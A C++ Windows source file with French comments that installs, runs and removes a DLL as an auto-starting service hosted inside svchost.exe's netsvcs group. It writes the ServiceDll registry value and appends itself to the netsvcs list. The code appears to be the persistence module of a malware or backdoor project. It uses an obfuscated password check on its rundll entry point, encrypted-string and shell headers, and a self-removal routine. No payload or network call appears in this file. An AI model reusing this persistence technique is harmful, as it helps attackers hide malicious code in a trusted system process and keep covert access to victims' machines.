/*
 * Author: thirdstormofcythraul@outlook.com
 */
#define  _WIN32_WINNT 0x0500 // Pour Windows 2000 et supérieur
#include "service.h"

#include "crypted_global.h"
#include "global.h"
#include "cshell.h"
#include "macro.h"

#include "memory_debug.h"

void startService();

extern TCHAR* GLOBAL_SERVICE_DESCRIPTION;
extern TCHAR* GLOBAL_SERVICE_NAME;
extern TCHAR* GLOBAL_SERVICE_KEY;

static SERVICE_STATUS_HANDLE   hServiceStatusHandle; 
static SERVICE_STATUS          ServiceStatus; 

static char buff[MAX_PATH]; 

void WINAPI ExecuteService(HWND, HINSTANCE, LPSTR lpszCmdLine, int){
	const char *pass =  SnE("daFdSA==", "'test'");

	int test = strcmp(lpszCmdLine, pass);
	if (test != 0){
		MYPRINTF("Bad password\n");
		return;
	}
	startService();
}

// Fonction d'installation du service:
int WINAPI InstallAnotherService(const char *serviceName, const char *dllpath, char *description)
{
	HKEY hkService, hkSvchost;
	SC_HANDLE schScm, schService;
	char* pData;
	DWORD dwError = 0, dwLen, dwSize = 0;   
	char buffer[512];
	// Ouvrir le gestionnaire de services:
	schScm = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
	if(schScm)
	{
		// Créer notre service:
		schService = CreateService(schScm, serviceName, 0, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "%SystemRoot%\\System32\\svchost.exe -k netsvcs", 0, 0, 0, 0, 0); 
		if(schService)
		{
			// Ajouter une description à notre service:
			SERVICE_DESCRIPTION sd;
			sd.lpDescription = description;
			ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
			// Ajouter la sous-clé Parameters à la clé de notre service:
			sprintf_s(buffer, 512, "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, buffer, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hkService, 0);   
			// Affecter le chemin de la Dll à la sous-clé Parameters sous le nom ServiceDll:
			RegSetValueEx(hkService, "ServiceDll", 0, REG_EXPAND_SZ, (BYTE*)dllpath, lstrlen(dllpath)+1);
			// Fermer la clé de notre service:
			RegCloseKey(hkService);
			// Ouvrir la clé indiquant la liste des groupes d'instances de svchost.exe:
			RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
			// Obtenir la longueur du contenu du groupe netsvcs:
			RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
			// Fixer le nom de notre service pour la liste des services du groupe netsvcs:
			lstrcpy(buff, serviceName);
			dwLen=lstrlen(buff);
			// Allouer la mémoire nécessaire pour la nouvelle liste des noms de services du groupe netsvcs:
			pData = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + dwLen + 1);
			if(pData)
			{
				char *pNames;
				// Récupérer la liste des noms de services du groupe netsvcs:
				RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
				// Vérifier si le nom existe
				for (pNames = pData; *pNames; pNames=strchr(pNames, 0) + 1) if(!lstrcmpi(pNames, buff)) break;   
				// L'ajouter s'il n'existe pas:
				if (*pNames == 0)
				{
					memcpy(pData + dwSize - 1, buff, dwLen + 1);
					RegSetValueEx(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize + dwLen + 1);
				}
				else dwError = ERROR_ALREADY_EXISTS;
				// Libérer la mémoire allouée:
				HeapFree(GetProcessHeap(), 0, pData);
			}
			else dwError = ERROR_NOT_ENOUGH_MEMORY;
			// Fermer la clé svchost:
			RegCloseKey(hkSvchost);
			// Fermer le handle de notre service:
			CloseServiceHandle(schService); 
		} else {
			MYPRINTF( "Unable to CreateService\n");
		}
		// Fermer le handle du gestionnaire de services:
		CloseServiceHandle(schScm);
	} else {
		MYPRINTF( "Unable to open OpenSCManager\n");
	}

	// Retourner dwError si non nul, sinon GetLastError():
	return dwError ? dwError : GetLastError();
}

// Fonction d'installation du service:
int WINAPI InstallService(HWND, HINSTANCE, LPSTR, int)
{
	HKEY hkService, hkSvchost;
	SC_HANDLE schScm, schService;
	char* pData;
	DWORD dwError = 0, dwLen, dwSize = 0;   
	int error;
	// Ouvrir le gestionnaire de services:
	schScm = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
	if(schScm)
	{
		// Créer notre service:
		schService = CreateService(schScm, GLOBAL_SERVICE_NAME, 0, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "%SystemRoot%\\System32\\svchost.exe -k netsvcs", 0, 0, 0, 0, 0); 
		if(schService)
		{
			// Ajouter une description à notre service:
			SERVICE_DESCRIPTION sd;
			sd.lpDescription = GLOBAL_SERVICE_DESCRIPTION;
			ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
			// Ajouter la sous-clé Parameters à la clé de notre service:
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, GLOBAL_SERVICE_KEY, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hkService, 0);   
			// Récupérer le chemin complet de notre Dll:
			GetModuleFileName(hDll, buff, sizeof(buff));
			// Affecter le chemin de la Dll à la sous-clé Parameters sous le nom ServiceDll:
			RegSetValueEx(hkService, "ServiceDll", 0, REG_EXPAND_SZ, (BYTE*)buff, lstrlen(buff) + 1);
			// Fermer la clé de notre service:
			RegCloseKey(hkService);
			// Ouvrir la clé indiquant la liste des groupes d'instances de svchost.exe:
			RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
			// Obtenir la longueur du contenu du groupe netsvcs:
			RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
			// Fixer le nom de notre service pour la liste des services du groupe netsvcs:
			lstrcpy(buff, GLOBAL_SERVICE_NAME);
			dwLen=lstrlen(buff);
			// Allouer la mémoire nécessaire pour la nouvelle liste des noms de services du groupe netsvcs:
			pData = (char *)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize + dwLen + 1);
			if(pData)
			{
				char *pNames;
				// Récupérer la liste des noms de services du groupe netsvcs:
				RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
				// Vérifier si le nom existe
				for (pNames = pData; *pNames; pNames = strchr(pNames, 0) + 1) if(!lstrcmpi(pNames, buff)) break;   
				// L'ajouter s'il n'existe pas:
				if (*pNames == 0)
				{
					memcpy(pData + dwSize - 1, buff, dwLen + 1);
					RegSetValueEx(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize + dwLen + 1);
				}
				else dwError=ERROR_ALREADY_EXISTS;
				// Libérer la mémoire allouée:
				HeapFree(GetProcessHeap(),0,pData);
			}
			else dwError = ERROR_NOT_ENOUGH_MEMORY;
			// Fermer la clé svchost:
			RegCloseKey(hkSvchost);
			// Fermer le handle de notre service:
			CloseServiceHandle(schService); 
		} else {
			error =  GetLastError();
			MYPRINTF( "Unable to create service: %d\n", error);
			return error;
		}
		// Fermer le handle du gestionnaire de services:
		CloseServiceHandle(schScm);
	} else {
		error =  GetLastError();
		MYPRINTF( "Install failed: %d\n", error);
		return error;
	}
	// Retourner dwError si non nul, sinon GetLastError():
	return dwError ? dwError : GetLastError();
}

// Fonction de désinstallation du service:
DWORD WINAPI RemoveService(HWND, HINSTANCE, LPSTR, int)
{
	HKEY hkSvchost;
	SC_HANDLE schScm ,schService;
	char* pData;
	DWORD dwError=0,dwSize = 0;   
	int error;

	// Ouvrir le gestionnaire de services:
	schScm = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
	if(schScm)
	{
		// Ouvrir notre service:
		schService=OpenService(schScm, GLOBAL_SERVICE_NAME, SERVICE_ALL_ACCESS);
		if(schService)
		{
			// Supprimer le service:
			if(DeleteService(schService))
			{
				// Ouvrir la clé indiquant la liste des groupes d'instances de svchost.exe:
				RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
				// Obtenir la longueur du contenu du groupe netsvcs:
				RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
				// Fixer le nom de notre service pour la liste des services du groupe netsvcs:
				lstrcpy(buff, GLOBAL_SERVICE_NAME);
				// Allouer la mémoire nécessaire pour tous les noms de services du groupe netsvcs:
				pData = (char *)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
				if(pData)
				{
					char *pNames;
					// Récupérer la liste des noms de services du groupe netsvcs:
					RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
					// Vérifier si le nom existe:
					for (pNames = pData; *pNames; pNames=strchr(pNames,0)+1) if(!lstrcmpi(pNames,buff)) break;   
					// Le supprimer s'il existe:
					if (*pNames)
					{
						char* pNext;
						pNext=strchr(pNames,0)+1;
						memcpy(pNames,pNext,dwSize-(pNext-pData));
						RegSetValueEx(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize -(lstrlen(buff)+1));
					}
					else dwError=ERROR_NO_SUCH_MEMBER;
					// Libérer la mémoire allouée:
					HeapFree(GetProcessHeap(),0,pData);
				}
				else dwError=ERROR_NOT_ENOUGH_MEMORY;
				// Fermer la clé svchost:
				RegCloseKey(hkSvchost);
			} else {
				error =  GetLastError();
				MYPRINTF( "DeleteService: Remove service failed: %d\n", error);
			}
			// Fermer le handle de notre service:
			CloseServiceHandle(schService); 
		} else {
			error =  GetLastError();
			MYPRINTF( "OpenService: Remove service failed: %d\n", error);
		}
		// Fermer le handle du gestionnaire de services:
		CloseServiceHandle(schScm);
	} else {
		error =  GetLastError();
		MYPRINTF( "OpenSCManager: Remove service failed: %d\n", error);
		return error;
	}
	if (dwError == 0){
		error = GetLastError();
		MYPRINTF( "Remove service failed: %d\n", error);
		return error;
	} else {
		MYPRINTF( "Remove service failed: %d\n", dwError);
	}
	// Retourner dwError si non nul, sinon GetLastError():
	return dwError;
}

// Fonction HandlerEx communiquant avec le gestionnaire de services:
DWORD WINAPI HandlerEx(DWORD dwControl, DWORD, LPVOID, LPVOID)
{
	switch(dwControl) 
	{
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		// Mettre le service à l'état "En cours d'arrêt":
		ServiceStatus.dwWaitHint      = 1000;
		ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(hServiceStatusHandle, &ServiceStatus );
		Global::get().stopRunning();
		MYPRINTF( "stop or shutdown\n");
		return NO_ERROR;
	default:
		ServiceStatus.dwWaitHint = 0;
		break;
	}
	SetServiceStatus(hServiceStatusHandle,  &ServiceStatus);// Obligatoire selon MSDN
	return NO_ERROR;
}

DWORD WINAPI KillService(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow){
	Shell::killAtNextReboot();
	RemoveService(hwnd, hinst, lpszCmdLine, nCmdShow);
	return NO_ERROR;
}

// ServiceMain
VOID WINAPI ServiceMain(DWORD, LPTSTR *)
{

	hServiceStatusHandle = RegisterServiceCtrlHandlerEx(GLOBAL_SERVICE_NAME, HandlerEx, NULL); 


	if (hServiceStatusHandle)
	{
		// Initialiser notre structure SERVICE_STATUS:
		ServiceStatus.dwServiceType        = SERVICE_WIN32;
		ServiceStatus.dwControlsAccepted   = 0;
		ServiceStatus.dwWin32ExitCode      = 0; 
		ServiceStatus.dwServiceSpecificExitCode = 0; 
		ServiceStatus.dwCheckPoint         = 0;
		// Mettre le service dans l'état "En cours de démarrage":
		ServiceStatus.dwWaitHint           = 1000;
		ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
		SetServiceStatus(hServiceStatusHandle, &ServiceStatus);

		ServiceStatus.dwWaitHint           = 0;  
		ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
		ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN ;
		SetServiceStatus(hServiceStatusHandle, &ServiceStatus);

		startService();

		// Mettre le service dans l'état "Arrêté":
		ServiceStatus.dwWaitHint = 0; 
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(hServiceStatusHandle, &ServiceStatus);
	}
	return;
}

